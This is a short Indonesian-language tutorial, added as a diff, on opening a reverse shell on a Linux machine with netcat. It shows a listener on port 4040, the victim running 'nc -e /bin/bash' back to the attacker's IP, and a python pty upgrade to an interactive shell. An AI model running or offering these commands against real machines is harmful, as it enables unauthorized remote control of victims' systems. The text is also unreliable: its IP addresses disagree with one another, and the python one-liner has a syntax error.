@@ -1,0 +1,38 @@
+### reversel ke linux
+
+# pertama kita setting listener nya
+# ini adalah jebakan
+# jika ada ip addres yangconnect ke ip kita maka kita bisa mengakses shell target kita
+$ nc -lnvp 4040 -s 192.168.43.134
+listening on [192.168.43.134] 4040 ...
+
+
+# di komputer target nya agar connect ke jebakan kita
+$ nc 192.168.23.134 4040
+
+# dan target sudah bisa kita akses
+
+# jika sudah connenct maka di komputer attacker akan ada tulisan :
+connect to [192.18.43.134] from (unknown) [ip korban] 35068
+
+# sekarang kita akan membuat si target mengirimkan shell yang mereka miliki ke kita / shell aktiva
+
+# buat listener baru
+$ nc -lnvp 4040 -s 192.168.43.134
+listening on [192.168.43.134] 4040 ...
+
+# di komputer korban
+$ nc -e /bin/bash 192.168.23.134 4040
+
+# jadi korban megizinkan si attacker untuk mengakses /bin/bash
+
+# kita bisa menambahkan interactive shell 
+# di komputer attacker yang sudah connet ke korban ketikan :
+$ python3 -c 'import pty: pty.spawn("/bin/bash")'
+# jika kita enter maka itu akan muncul interactive shell nya
+# contohnya seperti ini :
+
+┌──(kali㉿kali)-[~]
+└─$ 
+
+3 sekarang kita bisa lebih enak untuk menganses komputer si target nya
